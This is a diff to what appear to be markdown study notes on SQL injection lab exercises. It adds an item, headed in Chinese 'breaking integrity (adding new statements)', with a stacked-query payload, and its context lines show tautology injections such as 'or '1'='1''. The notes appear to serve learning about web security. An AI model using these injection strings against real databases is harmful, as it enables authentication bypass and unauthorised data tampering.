@@ -231,9 +231,12 @@ SELECT * From user_data WHERE Login_Count = 1 and userid= 1 or 1=1
 ```
 SELECT * FROM employees WHERE last_name = ‘Smith' AND auth_tan ='3SL99A' or '1'='1';
 ```
-8. pohua
+8. 破坏完整性（添加新的语句）
+```
+SELECT * FROM employees WHERE last_name = ‘Smith' AND auth_tan ='3SL99A';or '1'='1';
+```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTM5ODYzOTQ4MiwxODY5MTA3OTYxLC0xMj
+eyJoaXN0b3J5IjpbLTg2Mjk1NDk1MywxODY5MTA3OTYxLC0xMj
 MwNTQwNzY1LDExNTk2MjkyMjQsLTM4Mjg3NDgzOSwyOTE0MTUw
 NTUsLTE5Nzg5NjIxODQsLTEzODY0MjM0MSw4NTUxODY1MDEsMT
 M0MjAxNzAyNywxOTkyOTI0MywtNTAwOTQ2ODAxLDQ1MDA4OTIw
